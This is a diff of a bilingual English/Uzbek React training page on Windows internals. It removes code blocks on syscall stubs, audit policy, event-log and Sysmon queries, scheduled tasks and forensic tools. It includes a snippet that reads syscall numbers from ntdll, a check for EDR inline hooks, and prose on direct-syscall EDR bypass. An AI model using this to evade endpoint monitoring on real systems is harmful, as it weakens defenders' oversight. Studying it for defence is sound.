-    syscall                ; SYSCALL: save RIP→RCX, RSP→R11, load LSTAR into RIP
-    ret                    ; return to caller
-
-; In the kernel (ring 0):
-; nt!KiSystemCall64 → reads eax (SSN) → looks up SSDT[SSN] → calls actual function`}</code></pre>
       <P>The <Term>SSDT (System Service Descriptor Table)</Term> is a kernel array where each index maps an SSN to the corresponding kernel function. EDR kernel drivers hook the SSDT (or use callbacks) to intercept and inspect syscalls. Direct syscall attacks (bypassing ntdll stubs entirely) execute the <code>SYSCALL</code> instruction from user-mode shellcode with the hardcoded SSN to avoid userland hooks.</P>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.4 — Calling Convention (x64 fastcall)</h3>
@@ -8052,27 +7113,6 @@ NtCreateFile:
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.8 — Practical Commands</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Find SSN for any Nt function (ntdll offset method)
-# Each Nt stub starts: mov r10, rcx; mov eax, <SSN>
-python3 -c "
-import ctypes, struct
-ntdll = ctypes.WinDLL('ntdll')
-fn = ctypes.cast(getattr(ntdll, 'NtCreateFile'), ctypes.c_void_p).value
-buf = (ctypes.c_ubyte * 8).from_address(fn)
-print('SSN:', hex(struct.unpack_from('<H', bytes(buf), 4)[0]))
-"
-
-# Check if ntdll is hooked (compare byte 0 of Nt stubs to expected 4C 8B D1)
-# If byte 0 = 0xE9 (JMP) = hook present (EDR inline hook)
-Get-NtdllHooks.ps1   # PSReflect-based tool
-
-# Monitor all API calls in a process (WinDbg)
-sxe ld:ntdll        # break on ntdll load
-bp ntdll!NtCreateFile "du @rcx; g"   # log file paths
-
-# ETW syscall tracing (Admin, requires patching or TPM disabled)
-xperf -on PROC_THREAD+LOADER+DPC -stackwalk Profile -buffersize 2048
-# Then analyze .etl with Windows Performance Analyzer`}</code></pre>
     </section>
   ) : (
     <section>
@@ -8127,17 +7167,6 @@ xperf -on PROC_THREAD+LOADER+DPC -stackwalk Profile -buffersize 2048
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.3 — Syscall Mexanikasi (x64)</h3>
       <P>x64 Windows da kernel xizmatlarini talab qiladigan har bir Win32 API chaqiruvi oxir-oqibat ntdll dagi <Term>syscall stubiga</Term> etadi. Stub <Em>Tizim Xizmati Raqami (SSN)</Em> tayinlaydi va <code>SYSCALL</code> ko'rsatmasini bajaradi:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`; ntdll!NtCreateFile syscall stub (Windows 11 x64)
-NtCreateFile:
-    mov  r10, rcx          ; rcx ni (1-parametr) r10 da saqlash (ABI talabi)
-    mov  eax, 55h          ; SSN = 0x55 bu qurilmada NtCreateFile uchun
-    test byte ptr [SharedUserData+0x308], 1  ; Syscall Filtrlash tekshiruvi
-    jnz  short KiFastSystemCall2
-    syscall                ; SYSCALL: RIP→RCX, RSP→R11 saqlash, LSTAR dan RIP yuklash
-    ret                    ; chaqiruvchiga qaytish
-
-; Kernelda (ring 0):
-; nt!KiSystemCall64 → eax (SSN) o'qiydi → SSDT[SSN] qidiradi → haqiqiy funksiyani chaqiradi`}</code></pre>
       <P><Term>SSDT (Tizim Xizmati Tavsif Jadvali)</Term> — har bir indeks SSN ni mos kernel funksiyasiga moslashtiruvchi kernel massivi. EDR kernel drayverlari syscallarni to'xtatib tekshirish uchun SSDT ni hooklaydi (yoki callbacklar ishlatadi). To'g'ridan-to'g'ri syscall hujumlari (ntdll stublarini butunlay chetlab o'tib) foydalanuvchi makonidagi hooklerni chetlab o'tish uchun hardcoded SSN bilan foydalanuvchi rejimi shellcodedan <code>SYSCALL</code> ko'rsatmasini bajaradi.</P>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.4 — Chaqiruv Konventsiyasi (x64 fastcall)</h3>
@@ -8221,25 +7250,6 @@ NtCreateFile:
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.8 — Amaliy Buyruqlar</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Har qanday Nt funksiyasi uchun SSN topish (ntdll offset usuli)
-# Har bir Nt stub boshlanadi: mov r10, rcx; mov eax, <SSN>
-python3 -c "
-import ctypes, struct
-ntdll = ctypes.WinDLL('ntdll')
-fn = ctypes.cast(getattr(ntdll, 'NtCreateFile'), ctypes.c_void_p).value
-buf = (ctypes.c_ubyte * 8).from_address(fn)
-print('SSN:', hex(struct.unpack_from('<H', bytes(buf), 4)[0]))
-"
-
-# ntdll hooklanganligini tekshirish (Nt stub ning 0-bayti kutilgan 4C 8B D1 bilan solishtirish)
-# 0-bayt = 0xE9 (JMP) bo'lsa = hook mavjud (EDR inline hook)
-
-# Jarayondagi barcha API chaqiruvlarini kuzatish (WinDbg)
-sxe ld:ntdll
-bp ntdll!NtCreateFile "du @rcx; g"   # fayl yo'llarini log qilish
-
-# ETW syscall kuzatish (Admin)
-xperf -on PROC_THREAD+LOADER+DPC -stackwalk Profile -buffersize 2048`}</code></pre>
     </section>
   );
 }
@@ -8343,26 +7353,6 @@ function SectionEventViewer() {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.5 — Audit Policy Configuration</h3>
       <P>By default, Windows logs very little. Security Event IDs only fire if the corresponding <Term>audit policy</Term> subcategory is enabled. Critical subcategories to enable:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Enable process creation auditing with command line (requires KB3004375 on Win7/2008)
-auditpol /set /subcategory:"Process Creation" /success:enable
-auditpol /set /subcategory:"Process Termination" /success:enable
-
-# Enable detailed logon events
-auditpol /set /subcategory:"Logon" /success:enable /failure:enable
-auditpol /set /subcategory:"Special Logon" /success:enable
-
-# Enable privilege use
-auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
-
-# View current policy
-auditpol /get /category:*
-
-# Via Group Policy: Computer Config → Windows Settings → Security Settings
-#   → Advanced Audit Policy Configuration → Audit Policies → ...
-
-# Enable Process Creation command line (registry method)
-reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit" \
-  /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Log Tampering and Evasion</h3>
       <div style={{display:"flex",flexDirection:"column",gap:12,marginTop:12}}>
@@ -8380,27 +7370,6 @@ reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\A
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Querying Event Logs</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# PowerShell — query Security log for all failed logons (4625)
-Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} |
-  Select TimeCreated, @{n='User';e={$_.Properties[5].Value}},
-         @{n='IP';e={$_.Properties[19].Value}} | Format-Table
-
-# Get all process creations in last 1 hour (Event 4688)
-Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688;
-  StartTime=(Get-Date).AddHours(-1)} |
-  Select TimeCreated, @{n='Process';e={$_.Properties[5].Value}},
-         @{n='Cmdline';e={$_.Properties[8].Value}} | Format-List
-
-# wevtutil — export Security log to XML
-wevtutil epl Security C:\\out\\security.evtx
-wevtutil qe Security /q:"*[System[EventID=4624]]" /f:text /c:20
-
-# Query Sysmon for lsass access (Event 10)
-Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
-  Where {$_.Id -eq 10 -and $_.Message -match "lsass"} | Format-List
-
-# Real-time ETW session (low-level)
-logman start MySession -p "Microsoft-Windows-Security-Auditing" 0xFFFF 0 -ets -o C:\\trace.etl`}</code></pre>
     </section>
   ) : (
     <section>
@@ -8497,20 +7466,6 @@ logman start MySession -p "Microsoft-Windows-Security-Auditing" 0xFFFF 0 -ets -o
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.5 — Audit Siyosatini Sozlash</h3>
       <P>Standart bo'yicha Windows juda oz narsani jurnallaydi. Xavfsizlik Event ID lari faqat mos <Term>audit siyosati</Term> quyi toifasi yoqilgan bo'lsa ishga tushadi. Yoqish kerak bo'lgan muhim quyi toifalar:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Buyruq satri bilan jarayon yaratish auditini yoqish
-auditpol /set /subcategory:"Process Creation" /success:enable
-auditpol /set /subcategory:"Process Termination" /success:enable
-
-# Batafsil kirish hodisalarini yoqish
-auditpol /set /subcategory:"Logon" /success:enable /failure:enable
-auditpol /set /subcategory:"Special Logon" /success:enable
-
-# Joriy siyosatni ko'rish
-auditpol /get /category:*
-
-# Process Creation buyruq satrini yoqish (registry usuli)
-reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit" \
-  /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Log Buzish va Chetlab O'tish</h3>
       <div style={{display:"flex",flexDirection:"column",gap:12,marginTop:12}}>
@@ -8528,24 +7483,6 @@ reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\A
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Event Log So'rov Qilish</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# PowerShell — barcha muvaffaqiyatsiz kirish (4625) uchun Security jurnalini so'rash
-Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} |
-  Select TimeCreated, @{n='User';e={$_.Properties[5].Value}},
-         @{n='IP';e={$_.Properties[19].Value}} | Format-Table
-
-# So'nggi 1 soatdagi barcha jarayon yaratishlarni olish (Event 4688)
-Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688;
-  StartTime=(Get-Date).AddHours(-1)} |
-  Select TimeCreated, @{n='Process';e={$_.Properties[5].Value}},
-         @{n='Cmdline';e={$_.Properties[8].Value}} | Format-List
-
-# wevtutil — Security jurnalini XML ga eksport qilish
-wevtutil epl Security C:\\out\\security.evtx
-wevtutil qe Security /q:"*[System[EventID=4624]]" /f:text /c:20
-
-# lsass kirishini Sysmon da so'rash (Event 10)
-Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
-  Where {$_.Id -eq 10 -and $_.Message -match "lsass"} | Format-List`}</code></pre>
     </section>
   );
 }
@@ -8560,40 +7497,6 @@ function SectionTaskScheduler() {
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.1 — Task XML Structure</h3>
       <P>Every scheduled task is defined as an XML document conforming to the Task Scheduler schema. Key sections:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo>
-    <Description>Windows Defender Scheduled Scan</Description>
-    <Author>Microsoft Corporation</Author>
-  </RegistrationInfo>
-
-  <Triggers>                          <!-- WHEN to run -->
-    <CalendarTrigger>
-      <StartBoundary>2024-01-01T03:00:00</StartBoundary>
-      <ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
-    </CalendarTrigger>
-  </Triggers>
-
-  <Principals>                        <!-- WHO runs it / what privilege -->
-    <Principal id="Author">
-      <UserId>S-1-5-18</UserId>       <!-- LocalSystem SID -->
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <Hidden>false</Hidden>            <!-- attackers set to true -->
-  </Settings>
-
-  <Actions Context="Author">         <!-- WHAT to run -->
-    <Exec>
-      <Command>%SystemRoot%\\System32\\MpCmdRun.exe</Command>
-      <Arguments>-ScanType 1</Arguments>
-    </Exec>
-  </Actions>
-</Task>`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.2 — Trigger Types</h3>
       <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginTop:12}}>
@@ -8683,31 +7586,6 @@ function SectionTaskScheduler() {
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.7 — Practical Commands</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# List all scheduled tasks
-schtasks /query /fo LIST /v | more
-Get-ScheduledTask | Select TaskPath, TaskName, State | Format-Table
-
-# Export task XML
-schtasks /query /tn "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag" /xml
-
-# Show task details including RunAs and actions
-Get-ScheduledTask -TaskName "ScheduledDefrag" | Get-ScheduledTaskInfo
-(Get-ScheduledTask -TaskName "ScheduledDefrag").Actions
-(Get-ScheduledTask -TaskName "ScheduledDefrag").Principal
-
-# Find suspicious tasks (non-Microsoft, running as SYSTEM, unusual paths)
-Get-ScheduledTask | Where {
-  $_.Principal.UserId -match "SYSTEM|S-1-5-18" -and
-  $_.Actions.Execute -notmatch "(?i)system32|program files|syswow64"
-} | Select TaskName, @{n='Exec';e={$_.Actions.Execute}}
-
-# Create / delete task
-schtasks /create /tn "Test" /tr "calc.exe" /sc daily /st 12:00 /ru SYSTEM
-schtasks /delete /tn "Test" /f
-
-# Event log audit
-Get-WinEvent -FilterHashtable @{LogName='Security';Id=4698,4699,4700,4702} |
-  Select TimeCreated, @{n='Task';e={$_.Properties[4].Value}} | Format-Table`}</code></pre>
     </section>
   ) : (
     <section>
@@ -8716,39 +7594,6 @@ Get-WinEvent -FilterHashtable @{LogName='Security';Id=4698,4699,4700,4702} |
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.1 — Vazifa XML Tuzilishi</h3>
       <P>Har bir rejalashtirilgan vazifa Task Scheduler sxemasiga mos XML hujjat sifatida belgilanadi:</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo>
-    <Description>Windows Defender Scheduled Scan</Description>
-    <Author>Microsoft Corporation</Author>
-  </RegistrationInfo>
-
-  <Triggers>                          <!-- QACHON ishga tushirish -->
-    <CalendarTrigger>
-      <StartBoundary>2024-01-01T03:00:00</StartBoundary>
-      <ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
-    </CalendarTrigger>
-  </Triggers>
-
-  <Principals>                        <!-- KIM ishga tushiradi / qanday imtiyoz -->
-    <Principal id="Author">
-      <UserId>S-1-5-18</UserId>       <!-- LocalSystem SID -->
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <Hidden>false</Hidden>            <!-- hujumchilar true ga o'rnatadi -->
-  </Settings>
-
-  <Actions Context="Author">         <!-- NIMA ishga tushirish -->
-    <Exec>
-      <Command>%SystemRoot%\\System32\\MpCmdRun.exe</Command>
-      <Arguments>-ScanType 1</Arguments>
-    </Exec>
-  </Actions>
-</Task>`}</code></pre>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.2 — Trigger Turlari</h3>
       <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginTop:12}}>
@@ -8820,31 +7665,6 @@ Get-WinEvent -FilterHashtable @{LogName='Security';Id=4698,4699,4700,4702} |
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Amaliy Buyruqlar</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Barcha rejalashtirilgan vazifalarni ro'yxatga olish
-schtasks /query /fo LIST /v | more
-Get-ScheduledTask | Select TaskPath, TaskName, State | Format-Table
-
-# Vazifa XML ni eksport qilish
-schtasks /query /tn "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag" /xml
-
-# Vazifa tafsilotlarini ko'rsatish
-Get-ScheduledTask -TaskName "ScheduledDefrag" | Get-ScheduledTaskInfo
-(Get-ScheduledTask -TaskName "ScheduledDefrag").Actions
-(Get-ScheduledTask -TaskName "ScheduledDefrag").Principal
-
-# Shubhali vazifalarni topish (g'ayri-Microsoft, SYSTEM sifatida ishlaydigan)
-Get-ScheduledTask | Where {
-  $_.Principal.UserId -match "SYSTEM|S-1-5-18" -and
-  $_.Actions.Execute -notmatch "(?i)system32|program files|syswow64"
-} | Select TaskName, @{n='Exec';e={$_.Actions.Execute}}
-
-# Vazifa yaratish / o'chirish
-schtasks /create /tn "Test" /tr "calc.exe" /sc daily /st 12:00 /ru SYSTEM
-schtasks /delete /tn "Test" /f
-
-# Hodisa jurnali audit
-Get-WinEvent -FilterHashtable @{LogName='Security';Id=4698,4699,4700,4702} |
-  Select TimeCreated, @{n='Task';e={$_.Properties[4].Value}} | Format-Table`}</code></pre>
     </section>
   );
 }
@@ -8960,35 +7780,6 @@ function SectionWindowsLogs() {
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Practical Commands</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Chainsaw — bulk Sigma analysis of EVTX files
-chainsaw hunt C:\\Evidence\\Logs\\ -s C:\\sigma\\rules\\ --mapping C:\\chainsaw\\mappings\\sigma-event-logs-all.yml
-
-# Hayabusa — timeline with ATT&CK mapping
-hayabusa.exe csv-timeline -d C:\\Evidence\\Logs\\ -o timeline.csv -p verbose
-
-# KAPE — triage collection (Admin required)
-kape.exe --tsource C: --tdest C:\\Triage --target !SANS_Triage --module !EZParser
-
-# MFTECmd — parse $MFT to timeline CSV
-MFTECmd.exe -f C:\\Evidence\\\\$MFT --csv C:\\out\\ --csvf mft.csv
-
-# AmCache parser
-AppCompatCacheParser.exe -f C:\\Evidence\\SYSTEM --csv C:\\out\\
-
-# SRUM parser — extract per-app network bytes
-SrumECmd.exe -f C:\\Evidence\\SRUDB.dat --csv C:\\out\\
-
-# python-evtx — detect Record ID gaps
-python3 -c "
-import Evtx.Evtx as evtx, Evtx.Views as e_views
-with evtx.Evtx('Security.evtx') as log:
-    prev = None
-    for record in log.records():
-        rid = record.record_num()
-        if prev and rid != prev + 1:
-            print(f'GAP: {prev} -> {rid}')
-        prev = rid
-"`}</code></pre>
     </section>
   ) : (
     <section>
@@ -9097,35 +7888,6 @@ with evtx.Evtx('Security.evtx') as log:
       </div>
 
       <h3 className="mono" style={{color:"var(--accent)",marginTop:28}}>1.6 — Amaliy Buyruqlar</h3>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Chainsaw — EVTX fayllarini to'plamli Sigma tahlil
-chainsaw hunt C:\\Dalil\\Jurnal\\ -s C:\\sigma\\qoidalar\\ --mapping C:\\chainsaw\\mappings\\sigma-event-logs-all.yml
-
-# Hayabusa — ATT&CK moslash bilan vaqt jadvali
-hayabusa.exe csv-timeline -d C:\\Dalil\\Jurnal\\ -o jadval.csv -p verbose
-
-# KAPE — triage to'plash (Admin kerak)
-kape.exe --tsource C: --tdest C:\\Triage --target !SANS_Triage --module !EZParser
-
-# MFTECmd — $MFT ni vaqt jadvali CSV ga tahlil qilish
-MFTECmd.exe -f C:\\Dalil\\\\$MFT --csv C:\\chiqish\\ --csvf mft.csv
-
-# AmCache tahlilchi
-AppCompatCacheParser.exe -f C:\\Dalil\\SYSTEM --csv C:\\chiqish\\
-
-# SRUM tahlilchi — dastur bo'yicha tarmoq baytlarini olish
-SrumECmd.exe -f C:\\Dalil\\SRUDB.dat --csv C:\\chiqish\\
-
-# python-evtx — Yozuv ID bo'shliqlarini aniqlash
-python3 -c "
-import Evtx.Evtx as evtx
-with evtx.Evtx('Security.evtx') as log:
-    prev = None
-    for record in log.records():
-        rid = record.record_num()
-        if prev and rid != prev + 1:
-            print(f'BO_SHLIQ: {prev} -> {rid}')
-        prev = rid
-"`}</code></pre>
     </section>
   );
 }
@@ -9178,37 +7940,7 @@ function SectionSettings() {
       </div>
       <H2 num="§2" en="Settings App — URI Deep Links" uz="" />
       <P>The Settings app (<code>SystemSettings.exe</code>) uses the <Term>ms-settings:</Term> URI scheme for deep-linking to any page. Settings are stored in <code>HKCU</code> (per-user) or <code>HKLM</code> (machine-wide).</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`ms-settings:                     → Settings home
-ms-settings:windowsdefender     → Windows Security
-ms-settings:accounts             → Accounts
-ms-settings:signinoptions        → Sign-in options
-ms-settings:privacy-general      → Privacy settings
-ms-settings:windowsupdate        → Windows Update
-ms-settings:appsfeatures         → Apps & features
-ms-settings:network-wifi         → Wi-Fi
-
-# Open from Run (Win+R) or PowerShell:
-start ms-settings:windowsdefender
-start ms-settings:signinoptions`}</code></pre>
       <H2 num="§3" en="Control Panel — Key Applets" uz="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Security applets:
-  wf.msc              → Windows Firewall (Advanced Security)
-  secpol.msc          → Local Security Policy
-  lusrmgr.msc         → Local Users and Groups
-  control userpasswords2 / netplwiz → User Accounts (advanced)
-  control /name Microsoft.BitLockerDriveEncryption
-
-Hardware:
-  devmgmt.msc         → Device Manager
-  ncpa.cpl            → Network Connections
-  hdwwiz.cpl          → Add Hardware
-
-Programs:
-  appwiz.cpl          → Programs and Features (uninstall)
-  optionalfeatures    → Windows Features toggle
-
-Admin tools:
-  perfmon.msc   eventvwr.msc   compmgmt.msc   services.msc`}</code></pre>
       <H2 num="§4" en="Security-Relevant Settings" uz="" />
       <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,margin:"14px 0"}}>
         {[
@@ -9224,21 +7956,6 @@ Admin tools:
         ))}
       </div>
       <H2 num="§5" en="Practical Commands" uz="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Windows Defender status
-Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled
-
-# List startup apps (Apps → Startup in Settings)
-Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location
-
-# Check telemetry level
-reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection" /v AllowTelemetry
-
-# List installed UWP apps
-Get-AppxPackage | Select-Object Name, Version | Sort-Object Name
-
-# Persistence locations (Run keys)
-reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"`}</code></pre>
     </section>
   ) : (
     <section>
@@ -9256,36 +7973,7 @@ reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"`}</code></pr
       </div>
       <H2 num="§2" uz="Settings Ilovasi — URI Havolalari" en="" />
       <P>Settings ilovasi (<code>SystemSettings.exe</code>) har qanday sahifaga chuqur havola uchun <Term>ms-settings:</Term> URI sxemasidan foydalanadi. Sozlamalar <code>HKCU</code> (foydalanuvchi uchun) yoki <code>HKLM</code> (mashina uchun) da saqlanadi.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`ms-settings:                     → Bosh sahifa
-ms-settings:windowsdefender     → Windows xavfsizligi
-ms-settings:accounts             → Hisoblar
-ms-settings:signinoptions        → Kirish parametrlari
-ms-settings:privacy-general      → Maxfiylik sozlamalari
-ms-settings:windowsupdate        → Windows Update
-ms-settings:appsfeatures         → Ilovalar va xususiyatlar
-ms-settings:network-wifi         → Wi-Fi
-
-# Run (Win+R) yoki PowerShell orqali ochish:
-start ms-settings:windowsdefender
-start ms-settings:signinoptions`}</code></pre>
       <H2 num="§3" uz="Control Panel — Asosiy Appletlar" en="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`Xavfsizlik appletlari:
-  wf.msc              → Windows Xavfsizlik devori (Kengaytirilgan)
-  secpol.msc          → Mahalliy xavfsizlik siyosati
-  lusrmgr.msc         → Mahalliy foydalanuvchilar va guruhlar
-  control userpasswords2 / netplwiz → Foydalanuvchi hisoblari
-  control /name Microsoft.BitLockerDriveEncryption
-
-Apparat:
-  devmgmt.msc         → Qurilma menejeri
-  ncpa.cpl            → Tarmoq ulanishlari
-
-Dasturlar:
-  appwiz.cpl          → Dasturlar va xususiyatlar (o'chirish)
-  optionalfeatures    → Windows xususiyatlarini yoqish/o'chirish
-
-Boshqaruv vositalari:
-  perfmon.msc   eventvwr.msc   compmgmt.msc   services.msc`}</code></pre>
       <H2 num="§4" uz="Xavfsizlikka Oid Sozlamalar" en="" />
       <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,margin:"14px 0"}}>
         {[
@@ -9301,21 +7989,6 @@ Boshqaruv vositalari:
         ))}
       </div>
       <H2 num="§5" uz="Amaliy Buyruqlar" en="" />
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:12,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`# Windows Defender holati
-Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled
-
-# Ishga tushish dasturlari ro'yxati
-Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location
-
-# Telemetriya darajasini tekshirish
-reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection" /v AllowTelemetry
-
-# O'rnatilgan UWP ilovalar ro'yxati
-Get-AppxPackage | Select-Object Name, Version | Sort-Object Name
-
-# Persistenslik joylari (Run kalitlari)
-reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
-reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"`}</code></pre>
     </section>
   );
 }
@@ -9329,17 +8002,6 @@ function SectionMsconfig() {
     <section>
       <H2 num="§1" en="System Configuration — msconfig.exe" uz="" />
       <P><Term>msconfig.exe</Term> sets flags and preferences that take effect on next boot. It does not configure a running system. Use it for startup troubleshooting, diagnosing driver conflicts, and enabling Safe Boot.</P>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:10}}><code>{`msconfig.exe — 5 Tabs:
-┌─────────────────────────────────────────────────────────────┐
-│  [General]  [Boot]  [Services]  [Startup]  [Tools]         │
-└─────────────────────────────────────────────────────────────┘
-      │          │         │           │           │
-      ▼          ▼         ▼           ▼           ▼
-  Startup     OS list  Enable/     Task Mgr    Shortcuts
-   type       SafeBoot disable     redirect    to tools
-  (Normal/    options  non-MS      (Win10+)    (regedit,
-  Diagnostic/          services                 perfmon...)
-  Selective)`}</code></pre>
       <H2 num="§2" en="General Tab — Startup Types" uz="" />
       <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:12,margin:"14px 0"}}>
         {[
@@ -9371,71 +8033,18 @@ function SectionMsconfig() {
           </tbody>
         </table>
       </div>
-      <pre style={{background:"rgba(0,0,0,0.35)",border:"1px solid var(--border)",borderRadius:8,padding:"14px 16px",fontSize:11,lineHeight:1.7,overflowX:"auto",marginTop:14}}><code>{`Other Boot Tab options:
-  No GUI boot   → skip Windows logo animation
-  Boot log      → write to %SystemRoot%\\ntbtlog.txt
-  Base video    → force VGA 640x480 (fix display driver crash)
